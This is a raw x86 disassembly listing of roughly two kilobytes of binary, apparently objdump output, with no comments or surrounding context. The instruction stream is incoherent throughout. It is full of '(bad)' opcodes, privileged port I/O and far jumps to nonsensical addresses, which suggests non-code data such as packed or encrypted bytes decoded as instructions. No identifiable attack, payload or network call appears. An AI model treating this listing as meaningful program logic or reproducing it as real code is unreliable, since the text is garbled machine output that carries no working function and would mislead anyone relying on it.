  42b3ae:	rol    DWORD PTR ds:[ebp-0x28ee6f64],0x24
  42b3b6:	pusha  
  42b3b7:	std    
  42b3b8:	sub    BYTE PTR [edx],al
  42b3ba:	sti    
  42b3bb:	mov    ebx,0x237ff3de
  42b3c0:	mov    ah,0xc2
  42b3c2:	ficomp DWORD PTR ss:[ecx-0x2d3e0a61]
  42b3c9:	inc    edi
  42b3ca:	xor    eax,0xde4a8f3a
  42b3cf:	dec    edx
  42b3d0:	and    dh,BYTE PTR [esi+0x475d7223]
  42b3d6:	ins    BYTE PTR es:[edi],dx
  42b3d7:	retf   
  42b3d8:	and    bh,BYTE PTR [eax-0x2f]
  42b3db:	sar    DWORD PTR [esi-0x77],1
  42b3de:	data16 add ch,BYTE PTR [ebx+0x4c]
  42b3e2:	pop    es
  42b3e3:	dec    ebx
  42b3e4:	cmp    edi,eax
  42b3e6:	xchg   ebx,eax
  42b3e7:	push   cs
  42b3e8:	fwait
  42b3e9:	and    ah,BYTE PTR [ecx-0x6c]
  42b3ec:	cs mov edi,0xe3d1e10
  42b3f2:	and    al,0x80
  42b3f4:	xchg   edx,eax
  42b3f5:	retf   
  42b3f6:	add    cl,BYTE PTR [edx+ebx*1+0x4e0aa634]
  42b3fd:	cmp    ebx,ebp
  42b3ff:	div    dh
  42b401:	dec    esp
  42b402:	or     bl,BYTE PTR [edi-0x47]
  42b405:	mov    ch,0xda
  42b407:	fwait
  42b408:	sub    eax,0x25c753dd
  42b40d:	nop
  42b40e:	inc    esi
  42b40f:	icebp  
  42b410:	mov    al,ds:0x1a3d8dde
  42b415:	cs (bad) 
  42b419:	nop
  42b41a:	imul   ecx,DWORD PTR [esi],0x2d
  42b41d:	push   edx
  42b41e:	(bad)  
  42b41f:	jle    0x42b401
  42b421:	ja     0x42b3f7
  42b423:	stos   BYTE PTR es:[edi],al
  42b424:	fnsave [edx]
  42b426:	mov    gs,edi
  42b428:	adc    bh,ah
  42b42a:	sbb    BYTE PTR [esi],ah
  42b42c:	sahf   
  42b42d:	mov    ch,0x19
  42b42f:	push   cs
  42b430:	aas    
  42b431:	fidivr WORD PTR [esi-0x4a]
  42b434:	inc    BYTE PTR [edi-0x50503ba8]
  42b43a:	mov    cl,0x6a
  42b43c:	push   esp
  42b43d:	adc    esi,edx
  42b43f:	pop    ss
  42b440:	(bad)  
  42b441:	in     eax,0x9f
  42b443:	push   0x93224a6e
  42b448:	bound  edx,QWORD PTR [ecx]
  42b44a:	fwait
  42b44b:	sbb    DWORD PTR [edi+0x72b0284],ebx
  42b451:	aaa    
  42b452:	fst    DWORD PTR [edi+0x47605ec5]
  42b458:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b459:	mov    cl,0x2e
  42b45b:	popa   
  42b45c:	jmp    0x42b4d7
  42b45e:	retf   0xf803
  42b461:	sbb    bl,BYTE PTR [esi+0x43]
  42b464:	xchg   esp,eax
  42b465:	xchg   ecx,eax
  42b466:	cmp    ebp,DWORD PTR [esi-0x66]
  42b469:	enter  0x3cdb,0xe8
	...
  42b4d5:	add    BYTE PTR [edx-0x1011dfbb],cl
  42b4db:	out    dx,eax
  42b4dc:	into   
  42b4dd:	gs jo  0x42b4b0
  42b4e0:	cld    
  42b4e1:	test   DWORD PTR [ecx+0x6ebfd2ce],edi
  42b4e7:	iret   
  42b4e8:	add    DWORD PTR [eax],eax
  42b4ea:	inc    DWORD PTR [eax]
  42b4ec:	add    BYTE PTR [eax],al
  42b4ee:	mov    dl,BYTE PTR [ecx]
  42b4f0:	mov    bl,0xf9
  42b4f2:	push   ss
  42b4f3:	push   ebx
  42b4f4:	jle    0x42b522
  42b4f6:	std    
  42b4f7:	mov    ecx,0x2854e6cb
  42b4fc:	int3   
  42b4fd:	push   ds
  42b4fe:	pop    edx
  42b4ff:	cmp    eax,0xeef7e72e
  42b504:	repz inc edi
  42b506:	jle    0x42b57f
  42b508:	in     al,dx
  42b509:	add    cl,cl
  42b50b:	in     al,0xa4
  42b50d:	cld    
  42b50e:	loop   0x42b531
  42b510:	jnp    0x42b50e
  42b512:	imul   ecx,DWORD PTR [ebx],0xffffffd3
  42b515:	xchg   esi,eax
  42b516:	sti    
  42b517:	jl     0x42b49e
  42b519:	add    ch,BYTE PTR [ecx+0x45ce9996]
  42b51f:	mov    al,ds:0x461e952e
  42b524:	push   ebp
  42b525:	retf   
  42b526:	shr    DWORD PTR [esi-0x4099cffa],0xea
  42b52d:	in     eax,0xaf
  42b52f:	jbe    0x42b4f7
  42b531:	ret    0x76c
  42b534:	sbb    esp,esp
  42b536:	(bad)  
  42b537:	fsubr  QWORD PTR [edi]
  42b539:	xchg   DWORD PTR [edi-0x98dc753],esp
  42b53f:	pop    esi
  42b540:	push   cs
  42b541:	dec    ebx
  42b542:	pop    edi
  42b543:	fisttp QWORD PTR [edi]
  42b545:	inc    eax
  42b546:	fst    QWORD PTR [bp+si+0x5f]
  42b54a:	in     eax,0x0
  42b54c:	int    0xcb
  42b54e:	pushf  
  42b54f:	lods   eax,DWORD PTR ds:[esi]
  42b550:	adc    eax,0x4ad0d619
  42b555:	loopne 0x42b509
  42b557:	inc    edi
  42b558:	sub    BYTE PTR [ecx],ah
  42b55a:	jae    0x42b4fd
  42b55c:	mov    eax,ds:0xc9e1f6ff
  42b561:	mov    ecx,0xf76f47ef
  42b566:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b567:	and    eax,DWORD PTR [eax+0xee75f99]
  42b56d:	repz sti 
  42b56f:	dec    ebx
  42b570:	std    
  42b571:	adc    DWORD PTR [ebp+ecx*1+0x77e857b4],eax
  42b578:	ins    DWORD PTR es:[edi],dx
  42b579:	sar    DWORD PTR [ebx],1
  42b57b:	mov    edx,0xa5a414ee
  42b580:	xlat   BYTE PTR ds:[ebx]
  42b581:	mov    ebx,0xa3f4fe30
  42b586:	mov    ds,WORD PTR [ecx+0x58aac22a]
  42b58c:	cdq    
  42b58d:	or     eax,0x141336ac
  42b592:	scas   eax,DWORD PTR es:[edi]
  42b593:	enter  0x7148,0xf6
  42b597:	sub    eax,0xd225652a
  42b59c:	dec    esp
  42b59d:	(bad)  
  42b59e:	push   ebx
  42b59f:	add    BYTE PTR [edi-0x32],bh
  42b5a2:	bound  edx,QWORD PTR [edi+0x38a11ce0]
  42b5a8:	xchg   ebx,eax
  42b5a9:	out    dx,al
  42b5aa:	inc    ecx
  42b5ab:	dec    BYTE PTR [ebx+0x393205fb]
  42b5b1:	cs push edx
  42b5b3:	ror    DWORD PTR [ebx],1
  42b5b5:	out    dx,al
  42b5b6:	or     eax,0x64a0425a
  42b5bb:	jb     0x42b5b6
  42b5bd:	cmp    BYTE PTR [edx],0x9d
  42b5c0:	lods   eax,DWORD PTR ds:[esi]
  42b5c1:	ins    DWORD PTR es:[edi],dx
  42b5c2:	mov    dh,0x6e
  42b5c4:	or     DWORD PTR [edi],esi
  42b5c6:	mov    eax,0x1a012e94
  42b5cb:	es scas eax,DWORD PTR es:[edi]
  42b5cd:	aaa    
  42b5ce:	out    0xf5,eax
  42b5d0:	adc    DWORD PTR [ebx+ebx*4+0x56],edi
  42b5d4:	dec    ebx
  42b5d5:	xor    al,BYTE PTR ds:0x211aed5
  42b5db:	fcmovnu st,st(5)
  42b5dd:	or     BYTE PTR [ecx],bh
  42b5df:	fisubr DWORD PTR [edi+ebx*1]
  42b5e2:	xchg   ebp,eax
  42b5e3:	test   BYTE PTR [edi+0x7a],0xc4
  42b5e7:	xchg   esp,eax
  42b5e8:	pop    ecx
  42b5e9:	iret   
  42b5ea:	daa    
  42b5eb:	bound  ecx,QWORD PTR [ecx+0x0]
	...
  42b656:	loopne 0x42b5ec
  42b658:	and    bh,cl
  42b65a:	je     0x42b65b
  42b65c:	out    dx,eax
  42b65d:	mov    edi,0x1397875f
  42b662:	sub    eax,0x6d0dec15
  42b667:	rol    BYTE PTR [ecx],1
  42b669:	add    bh,bh
  42b66b:	add    BYTE PTR [eax],al
  42b66d:	add    BYTE PTR [ebx-0x69540],bl
  42b673:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b674:	outs   dx,BYTE PTR ds:[esi]
  42b675:	xchg   edx,eax
  42b676:	(bad)  
  42b677:	xchg   edx,eax
  42b678:	xor    al,0x69
  42b67a:	push   ds
  42b67b:	out    0xd2,al
  42b67d:	clc    
  42b67e:	outs   dx,BYTE PTR ds:[esi]
  42b67f:	into   
  42b680:	add    DWORD PTR [edx],eax
  42b682:	test   DWORD PTR [esi+ebp*2-0x7950f7cc],ecx
  42b689:	sub    dl,BYTE PTR [esi]
  42b68b:	in     al,dx
  42b68c:	pop    edi
  42b68d:	and    eax,DWORD PTR [eax-0x1958a995]
  42b693:	add    BYTE PTR [edx],0xbf
  42b696:	xchg   ebp,eax
  42b697:	popa   
  42b698:	adc    al,0xa4
  42b69a:	scas   al,BYTE PTR es:[edi]
  42b69b:	cwde   
  42b69c:	xor    al,0x10
  42b69e:	das    
  42b69f:	icebp  
  42b6a0:	xchg   DWORD PTR [ecx-0x165136eb],ebx
  42b6a6:	cmp    cl,BYTE PTR [ebp+0x40]
  42b6a9:	out    dx,al
  42b6aa:	fwait
  42b6ab:	shl    cl,0xfd
  42b6ae:	push   es
  42b6af:	pop    ds
  42b6b0:	mov    eax,cs
  42b6b2:	pop    ecx
  42b6b3:	sub    edi,DWORD PTR [ebp+0x1]
  42b6b6:	rcl    bl,0x98
  42b6b9:	(bad)  
  42b6ba:	jle    0x42b6e5
  42b6bc:	fistp  QWORD PTR [ebp+ecx*8+0x50e030bf]
  42b6c3:	sahf   
  42b6c4:	xor    esi,DWORD PTR [esi]
  42b6c6:	sti    
  42b6c7:	out    dx,al
  42b6c8:	adc    ebx,DWORD PTR [edi]
  42b6ca:	pop    ebx
  42b6cb:	jns    0x42b6db
  42b6cd:	mov    edx,0x2e458635
  42b6d2:	xor    BYTE PTR [esi-0x38],bh
  42b6d5:	push   esp
  42b6d6:	repnz addr16 out dx,eax
  42b6d9:	mov    ch,0x9e
  42b6db:	mov    ebx,0xd062bc45
  42b6e0:	outs   dx,DWORD PTR ds:[esi]
  42b6e1:	daa    
  42b6e2:	or     dh,bl
  42b6e4:	fsub   QWORD PTR [edi+0x38]
  42b6e7:	lock mov al,0xdd
  42b6ea:	imul   ebp,eax,0x35
  42b6ed:	jg     0x42b762
  42b6ef:	ja     0x42b710
  42b6f1:	mov    esi,0xb19ea979
  42b6f6:	out    dx,eax
  42b6f7:	add    BYTE PTR [ebx],bh
  42b6f9:	ret    
  42b6fa:	xlat   BYTE PTR ds:[ebx]
  42b6fb:	out    0xc9,eax
  42b6fd:	je     0x42b6bd
  42b6ff:	test   al,0x0
  42b701:	scas   al,BYTE PTR es:[edi]
  42b702:	mov    ebx,0x74efe9ee
  42b707:	jp     0x42b770
  42b709:	jg     0x42b6f3
  42b70b:	add    esi,DWORD PTR [ecx]
  42b70d:	or     eax,DWORD PTR [eax+0x1364ba3d]
  42b713:	mov    DWORD PTR [edx+0x18],esi
  42b716:	mov    eax,0xe1ba0ac8
  42b71b:	clc    
  42b71c:	sbb    eax,0x17ec0aa5
  42b721:	mov    eax,ds:0x93d38f99
  42b726:	add    DWORD PTR [ebx-0x3a],0x24
  42b72a:	cmp    esp,ebp
  42b72c:	dec    ecx
  42b72d:	push   DWORD PTR [ebp-0x4a2f392f]
  42b733:	mov    ecx,0xe2c4103
  42b738:	dec    DWORD PTR [esi+0x2a5a7817]
  42b73e:	jl     0x42b7b5
  42b740:	repnz fcmovb st,st(7)
  42b743:	xchg   ecx,eax
  42b744:	inc    edx
  42b745:	adc    eax,0x9020ed47
  42b74a:	cs es push esi
  42b74d:	retf   
  42b74e:	pop    edi
  42b74f:	lods   eax,DWORD PTR ds:[esi]
  42b750:	sbb    BYTE PTR [edx],ch
  42b752:	and    bl,ch
  42b754:	mov    edi,0xd05ba6dc
  42b759:	ret    0xcdf7
  42b75c:	pop    esp
  42b75d:	mov    bh,0x7c
  42b75f:	loope  0x42b7d8
  42b761:	jb     0x42b73a
  42b763:	mov    ah,0x92
  42b765:	jno    0x42b784
  42b767:	and    eax,0x37ca1447
  42b76c:	push   edi
	...
  42b7d5:	add    BYTE PTR [esi+0x42],cl
  42b7d8:	dec    ecx
  42b7d9:	daa    
  42b7da:	dec    ebp
  42b7db:	das    
  42b7dc:	outs   dx,BYTE PTR ds:[esi]
  42b7dd:	imul   edx,edx,0x63
  42b7e0:	push   ecx
  42b7e1:	xchg   edx,eax
  42b7e2:	arpl   si,di
  42b7e4:	fs lock ins BYTE PTR es:[edi],dx
  42b7e7:	rol    DWORD PTR [ecx],1
  42b7e9:	add    bh,bh
  42b7eb:	add    BYTE PTR [eax],al
  42b7ed:	add    BYTE PTR [esi],cl
  42b7ef:	xchg   edx,eax
  42b7f0:	add    al,0x7d
  42b7f2:	fadd   DWORD PTR [esi*4+0x1a2be7d7]
  42b7f9:	xchg   esi,eax
  42b7fa:	std    
  42b7fb:	and    BYTE PTR [edi-0x4f8d749a],0xf4
  42b802:	push   0x2d
  42b804:	cmp    bh,BYTE PTR [ebp+0x3adbed6]
  42b80a:	repz mov ds:0x4475b585,eax
  42b810:	jnp    0x42b803
  42b812:	inc    ecx
  42b813:	add    DWORD PTR [edx+0x31],ebp
  42b816:	mov    edi,0x3b62de36
  42b81b:	and    BYTE PTR [esi+0x72],0x4
  42b81f:	jmp    0x37f5a3e2
  42b824:	scas   al,BYTE PTR es:[edi]
  42b825:	jne    0xc3382544
  42b82b:	mov    ah,0xfc
  42b82d:	(bad)  
  42b82e:	fnstsw WORD PTR [esp+ebx*4-0x65b5c46c]
  42b835:	sbb    DWORD PTR [esi-0x75],ebp
  42b838:	jb     0x42b86a
  42b83a:	xlat   BYTE PTR ds:[ebx]
  42b83b:	or     ch,BYTE PTR [ebx]
  42b83d:	sahf   
  42b83e:	adc    al,0xe9
  42b840:	jnp    0x42b7ed
  42b842:	je     0x62090b
  42b848:	fiadd  WORD PTR [ebx]
  42b84a:	dec    esi
  42b84b:	rcl    eax,1
  42b84d:	and    DWORD PTR [eax],edx
  42b84f:	add    BYTE PTR [eax],ch
  42b851:	cld    
  42b852:	inc    ecx
  42b853:	les    esi,FWORD PTR [eax]
  42b855:	xor    edi,esi
  42b857:	add    BYTE PTR [esi+0x7f],ah
  42b85a:	sub    eax,0x4e5e0977
  42b85f:	lea    eax,[ebx-0x5b]
  42b862:	jmp    0xb9bd:0x82bd8e40
  42b869:	or     eax,0x2d74bff3
  42b86e:	jbe    0x42b8d9
  42b870:	pop    edx
  42b871:	icebp  
  42b872:	fst    st(5)
  42b874:	xchg   esi,eax
  42b875:	mov    bh,0x19
  42b877:	dec    ebp
  42b878:	add    BYTE PTR ss:[ecx+0x72],al
  42b87c:	xchg   edi,eax
  42b87d:	out    0x5b,al
  42b87f:	je     0x42b8ea
  42b881:	pop    ds
  42b882:	aam    0x6
  42b884:	call   0xb0a0c0cb
  42b889:	lods   al,BYTE PTR ds:[esi]
  42b88a:	call   0xd10ec12
  42b88f:	jecxz  0x42b877
  42b891:	sub    DWORD PTR [ebp+0x1a],ebx
  42b894:	sub    al,0x69
  42b896:	aas    
  42b897:	cmp    bl,bh
  42b899:	mov    edx,0x8b00b706
  42b89e:	pop    esi
  42b89f:	pop    es
  42b8a0:	call   0x54d1:0xcdf33747
  42b8a7:	mov    edx,0x5239f3f5
  42b8ac:	push   ecx
  42b8ad:	dec    eax
  42b8ae:	sub    DWORD PTR [ebp-0x48],ecx
  42b8b1:	mov    edi,0x10deb53e
  42b8b6:	dec    ebp
  42b8b7:	js     0x42b92c
  42b8b9:	ror    esp,1
  42b8bb:	and    dh,BYTE PTR [ebx+0x4d27af7d]
  42b8c1:	repnz sub esi,ecx
  42b8c4:	clc    
  42b8c5:	xor    al,0xc2
  42b8c7:	adc    eax,0x79f74a3b
  42b8cc:	int3   
  42b8cd:	dec    edx
  42b8ce:	push   ds
  42b8cf:	std    
  42b8d0:	shl    BYTE PTR [edi+0x7d],cl
  42b8d3:	out    0xd8,eax
  42b8d5:	fwait
  42b8d6:	sub    ecx,eax
  42b8d8:	sbb    DWORD PTR [ebp-0x53b4f91e],ebx
  42b8de:	xor    eax,DWORD PTR [ebp-0x3dfd3630]
  42b8e4:	jno    0x42b920
  42b8e6:	push   es
  42b8e7:	xor    BYTE PTR [ebx-0x76],ah
  42b8ea:	imul   ebp,DWORD PTR [edi],0x7c
	...
  42b954:	add    BYTE PTR [eax],al
  42b956:	call   0x2a77f8
  42b95b:	out    0xf9,eax
  42b95d:	lahf   
  42b95e:	ret    0x608c
  42b961:	or     edi,DWORD PTR [edi+0x3a]
  42b964:	sub    dl,BYTE PTR [edx+0x6b]
  42b967:	rol    BYTE PTR [ecx],cl
  42b969:	add    bh,bh
  42b96b:	add    BYTE PTR [eax],al
  42b96d:	add    BYTE PTR [ebp-0x1c],bl
  42b970:	iret   
  42b971:	aaa    
  42b972:	pop    ds
  42b973:	cmp    eax,0xcee294af
  42b978:	sbb    bh,BYTE PTR [ecx+0xe0c27dc]
  42b97e:	jp     0x42b9cd
  42b980:	cmc    
  42b981:	xchg   ebx,eax
  42b982:	pop    edx
  42b983:	lods   eax,DWORD PTR ds:[esi]
  42b984:	mov    cs,edi
  42b986:	(bad)  
  42b987:	xor    BYTE PTR [ebp+0x1295531a],ah
  42b98d:	xchg   esi,eax
  42b98e:	pop    edi
  42b98f:	pop    ebx
  42b990:	dec    edx
  42b991:	ins    BYTE PTR es:[edi],dx
  42b992:	ja     0x42b9b5
  42b994:	int    0xcd
  42b996:	sub    al,0x66
  42b998:	xchg   ecx,eax
  42b999:	aad    0xe1
  42b99b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b99c:	lods   al,BYTE PTR ds:[esi]
  42b99d:	lods   al,BYTE PTR ds:[esi]
  42b99e:	lahf   
  42b99f:	out    dx,eax
  42b9a0:	push   esp
  42b9a1:	(bad)  
  42b9a3:	push   ebp
  42b9a4:	mov    al,ah
  42b9a6:	dec    edx
  42b9a7:	sbb    bh,ch
  42b9a9:	push   ebp
  42b9aa:	lods   al,BYTE PTR ds:[esi]
  42b9ab:	lds    ecx,FWORD PTR [edi]
  42b9ad:	dec    edi
  42b9ae:	sbb    ch,cl
  42b9b0:	fiadd  WORD PTR [edx+0x2357c298]
  42b9b6:	mov    eax,ds:0x30d06228
  42b9bb:	jae    0x42b9e2
  42b9bd:	stc    
  42b9be:	ret    0x6955
  42b9c1:	nop
  42b9c2:	cld    
  42b9c3:	cmc    
  42b9c4:	not    DWORD PTR [esi]
  42b9c6:	sub    DWORD PTR [ebx],edx
  42b9c8:	adc    ch,BYTE PTR fs:[ecx]
  42b9cb:	jmp    0x39129ccb
  42b9d0:	sbb    eax,0x7b531a75
  42b9d5:	xlat   BYTE PTR ds:[ebx]
  42b9d6:	and    al,0x63
  42b9d8:	dec    esi
  42b9d9:	push   esp
  42b9da:	push   0xd080e1ec
  42b9df:	lods   al,BYTE PTR ds:[esi]
  42b9e0:	outs   dx,DWORD PTR ds:[esi]
  42b9e1:	or     eax,0xa97fa507
  42b9e6:	retf   0xcb45
  42b9e9:	mov    WORD PTR [ebp-0x69],fs
  42b9ec:	into   
  42b9ed:	inc    ebp
  42b9ee:	leave  
  42b9ef:	out    dx,al
  42b9f0:	xlat   BYTE PTR ds:[ebx]
  42b9f1:	inc    edx
  42b9f2:	inc    ebp
  42b9f3:	push   esp
  42b9f4:	lea    ecx,[edi-0x2]
  42b9f7:	xchg   ecx,eax
  42b9f8:	jmp    0x60cacd0a
  42b9fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b9fe:	pop    ds
  42b9ff:	shl    cl,cl
  42ba01:	js     0x42ba38
  42ba03:	ss add al,0x48
  42ba06:	fs clc 
  42ba08:	jmp    0x42b9d9
  42ba0a:	or     DWORD PTR ds:0x50efbeeb,0xffffffe3
  42ba11:	test   eax,0x8cf8573d
  42ba17:	shl    BYTE PTR [edi+eiz*8-0x7ea31e54],cl
  42ba1e:	std    
  42ba1f:	xchg   ebp,eax
  42ba20:	push   ebx
  42ba21:	arpl   si,di
  42ba23:	imul   eax,DWORD PTR [edi],0xfcc451f7
  42ba29:	sbb    eax,0x81902e33
  42ba2e:	popf   
  42ba2f:	(bad)  
  42ba30:	ins    BYTE PTR es:[edi],dx
  42ba31:	mov    DWORD PTR [ecx+0x1b],ecx
  42ba34:	into   
  42ba35:	xlat   BYTE PTR ds:[ebx]
  42ba36:	cmp    eax,0x3466f653
  42ba3b:	xor    al,BYTE PTR [eax+0x1cc1017d]
  42ba41:	mov    WORD PTR [esi],gs
  42ba43:	mov    bl,0x5f
  42ba45:	aaa    
  42ba46:	scas   al,BYTE PTR es:[edi]
  42ba47:	das    
  42ba48:	cs dec ebx
  42ba4a:	les    edi,FWORD PTR [edi+0x54]
  42ba4d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ba4e:	push   ebp
  42ba4f:	psubsb mm2,QWORD PTR [eax+0x2c44916e]
  42ba56:	fsub   QWORD PTR [edx]
  42ba58:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ba59:	xlat   BYTE PTR ds:[ebx]
  42ba5a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ba5b:	cmp    esi,DWORD PTR [ebp+0x1e7fa8c4]
  42ba61:	ror    DWORD PTR [ebx],cl
  42ba63:	sbb    DWORD PTR [eax+edi*4-0x22],ebp
  42ba67:	xlat   BYTE PTR ds:[ebx]
  42ba68:	add    BYTE PTR [ecx],0x87
  42ba6b:	fwait
  42ba6c:	icebp  
	...
  42bad5:	add    BYTE PTR [ebx-0x431d4ff9],cl
  42badb:	neg    ebx
  42badd:	outs   dx,DWORD PTR ds:[esi]
  42bade:	push   0x5b
  42bae0:	xchg   ecx,eax
  42bae1:	or     DWORD PTR [ebp+0x6a23e643],eax
  42bae7:	rol    DWORD PTR [ecx],cl
  42bae9:	add    bh,bh
  42baeb:	add    BYTE PTR [eax],al
  42baed:	add    BYTE PTR [edi+0x10],ch
  42baf0:	mov    al,0xc4
  42baf2:	pushf  
  42baf3:	adc    eax,ecx
  42baf5:	jne    0x42bb3b
  42baf7:	pop    ss
  42baf8:	cld    
  42baf9:	test   DWORD PTR [edx],esi
  42bafb:	call   0x953:0x3fab878a
  42bb02:	jo     0x42baeb
  42bb04:	push   eax
  42bb05:	push   edi
  42bb06:	add    bh,bh
  42bb08:	addr16 push ebx
  42bb0a:	scas   eax,DWORD PTR es:[edi]
  42bb0b:	xor    eax,0x763b8022
  42bb10:	jnp    0x42bb0e
  42bb12:	jne    0x42ba9c
  42bb14:	mov    ds:0x25869660,eax
  42bb19:	or     bh,dh
  42bb1b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42bb1c:	push   esp
  42bb1d:	js     0x42bb48
  42bb1f:	jns    0x42bad6
  42bb21:	nop
  42bb22:	loop   0x42baaa
  42bb24:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42bb25:	jmp    0x42bb5a
  42bb27:	xchg   DWORD PTR [ecx-0x80],ebp
  42bb2a:	add    al,0x7a
  42bb2c:	imul   edi,esp,0x56
  42bb2f:	sar    BYTE PTR [ecx+0x56],0xbc
  42bb33:	stos   BYTE PTR es:[edi],al
  42bb34:	je     0x42bb3d
  42bb36:	mov    ebx,0x4956da87
  42bb3b:	push   esi
  42bb3c:	inc    ebp
  42bb3d:	and    BYTE PTR [edx],bh
  42bb3f:	stos   BYTE PTR es:[edi],al
  42bb40:	cmp    esi,0xd
  42bb43:	jl     0x42bb65
  42bb45:	xchg   ecx,eax
  42bb46:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42bb47:	fnsave [ebp+0x55279e93]
  42bb4d:	js     0x42baef
  42bb4f:	jnp    0x42bb0a
  42bb51:	sub    DWORD PTR [esp+eax*2+0x3325d235],0x28fbde44
  42bb5c:	or     edi,0xfffffff3
  42bb5f:	cmp    al,0xa4
  42bb61:	xor    ah,dl
  42bb63:	cld    
  42bb64:	xor    al,0x79
  42bb66:	mov    edi,0x8c91323a
  42bb6b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42bb6c:	or     DWORD PTR [esi],ebp
  42bb6e:	out    0x9c,al
  42bb70:	test   al,0xed
  42bb73:	dec    esi
  42bb74:	in     al,dx
  42bb75:	cmp    esp,esi
  42bb77:	test   eax,0xc1a3fa9d
  42bb7c:	jmp    0x4d36ec5d
  42bb81:	nop
  42bb82:	shl    BYTE PTR [edi-0x1e],0xc8
  42bb86:	and    eax,0x4d88bfee
  42bb8b:	shl    BYTE PTR [eax],1
  42bb8d:	adc    ebp,DWORD PTR [esi+0x3c9877ba]
  42bb93:	jecxz  0x42bb26
  42bb95:	imul   eax,DWORD PTR [esi],0xffffff99
  42bb98:	add    bl,0x19
  42bb9b:	retf   0x5a75
  42bb9e:	retf   
  42bb9f:	add    bh,cl
  42bba1:	pushf  
  42bba2:	dec    DWORD PTR [ebx-0x19858b18]
  42bba8:	push   eax
  42bba9:	mov    WORD PTR [esi+0x7e9d6169],ss
  42bbaf:	cmp    DWORD PTR [ecx+0x7c],0x787c751b
  42bbb6:	repz rcr DWORD PTR [edx+0x28],cl
  42bbba:	out    dx,eax
  42bbbb:	gs retf 
  42bbbd:	xchg   ebx,eax
  42bbbe:	rol    DWORD PTR [ebx+0x16e12631],1
  42bbc4:	sti    
  42bbc5:	mov    tr6,ecx
  42bbc8:	mov    cl,0x61
  42bbca:	sub    BYTE PTR [ebp+0x7b],ah
  42bbcd:	push   0xf04b9ed8
  42bbd2:	pop    ebx
  42bbd3:	retf   
  42bbd4:	mov    al,ds:0x5d05279
  42bbd9:	cwde   
  42bbda:	ins    BYTE PTR es:[edi],dx
  42bbdb:	gs mov eax,0xdbdaf045
  42bbe1:	jnp    0x42bc09
  42bbe3:	pop    ebx
  42bbe4:	push   eax
  42bbe5:	pushf  
  42bbe6:	popf   
  42bbe7:	(bad)  
  42bbe8:	sbb    ebp,DWORD PTR [edx+0x9a822e]
	...
  42bc56:	xor    al,0x28
  42bc58:	add    DWORD PTR [esi],eax
  42bc5a:	sbb    eax,0x233a372f
  42bc5f:	sub    DWORD PTR [ebx],eax
  42bc61:	dec    ecx
  42bc62:	enter  0x3eba,0xd7
  42bc66:	imul   edx,esp,0xff0001
  42bc6c:	add    BYTE PTR [eax],al
  42bc6e:	rcr    DWORD PTR cs:[edi+ebx*1+0x2f],cl
  42bc73:	cmc    
  42bc74:	call   0x2436d5c2
  42bc79:	add    cl,BYTE PTR [ecx]
  42bc7b:	jns    0x42bc0f
  42bc7d:	outs   dx,DWORD PTR ds:[esi]
  42bc7e:	inc    edi
  42bc7f:	in     eax,0x9a
  42bc81:	mov    ds:0xbc4268b5,al
  42bc86:	or     bh,0x69
  42bc89:	and    DWORD PTR [ebx+0x35],0x12
  42bc8d:	sbb    ebp,DWORD PTR [ebx-0x100fac94]
  42bc93:	test   DWORD PTR [esi-0x612dd007],ecx
  42bc99:	into   
  42bc9a:	int3   
  42bc9b:	in     eax,0x0
  42bc9d:	ftst   
  42bc9f:	lods   al,BYTE PTR ds:[esi]
  42bca0:	and    al,0xbf
  42bca2:	xchg   DWORD PTR [edx+0x1e096f7c],esp
  42bca8:	sbb    cl,BYTE PTR [ebx+ebp*4-0x575d3ff]
  42bcaf:	push   ss
  42bcb0:	sbb    BYTE PTR [esi+0x3c],0x17
  42bcb4:	aad    0x45
  42bcb6:	stc    
  42bcb7:	push   ecx
  42bcb8:	mov    ecx,0x34948e70
  42bcbd:	in     al,dx
  42bcbe:	gs addr16 aas 
  42bcc1:	shl    BYTE PTR [edi+0x1a],0xc6
  42bcc5:	ficom  WORD PTR [edi-0x44]
  42bcc8:	(bad)  
  42bcc9:	sbb    al,0x8b
  42bccb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42bccc:	and    eax,esi
  42bcce:	lods   eax,DWORD PTR ds:[esi]
  42bccf:	psraw  mm2,mm5
  42bcd2:	pop    eax
  42bcd3:	into   
  42bcd4:	inc    edx
  42bcd5:	rol    cl,0x8d
  42bcd8:	call   0x3af2:0x176e674b
  42bcdf:	push   edi
  42bce0:	sbb    al,0x3a
  42bce2:	jmp    0x42bccc
  42bce4:	rol    eax,0xbd
  42bce7:	es xor ah,0x9d
  42bceb:	cmp    al,dl
  42bced:	repnz stos BYTE PTR es:[edi],al
  42bcef:	dec    ebp
  42bcf0:	das    
  42bcf1:	mov    dh,0xb7
  42bcf3:	aas    
  42bcf4:	hlt    
  42bcf5:	das    
  42bcf6:	xor    edi,ebp
  42bcf8:	ret    0xd458
  42bcfb:	and    eax,0xcdcba9f6
  42bd00:	lods   eax,DWORD PTR ds:[esi]
  42bd01:	stos   DWORD PTR es:[edi],eax
  42bd02:	jl     0x42bca8
  42bd04:	pop    esi
  42bd05:	(bad)  [edx-0xd8e524]
  42bd0b:	addr16 in eax,dx
  42bd0d:	aad    0xff
  42bd0f:	lea    esp,[ebx]
  42bd11:	iret   
  42bd12:	js     0x42bcf8
  42bd14:	fwait
  42bd15:	push   0x1d
  42bd17:	jbe    0x42bd03
  42bd19:	loopne 0x42bd1d
  42bd1b:	mov    ecx,0x79a2b9cb
  42bd20:	and    cl,BYTE PTR [esp+ebx*1+0x0]
  42bd24:	mov    ds:0x7ce383bb,al
  42bd29:	outs   dx,DWORD PTR ds:[esi]
  42bd2a:	rol    ebp,1
  42bd2c:	inc    esp
  42bd2d:	push   ss
  42bd2e:	scas   eax,DWORD PTR es:[edi]
  42bd2f:	push   esp
  42bd30:	lahf   
  42bd31:	jmp    0xa9e9:0xe0df539
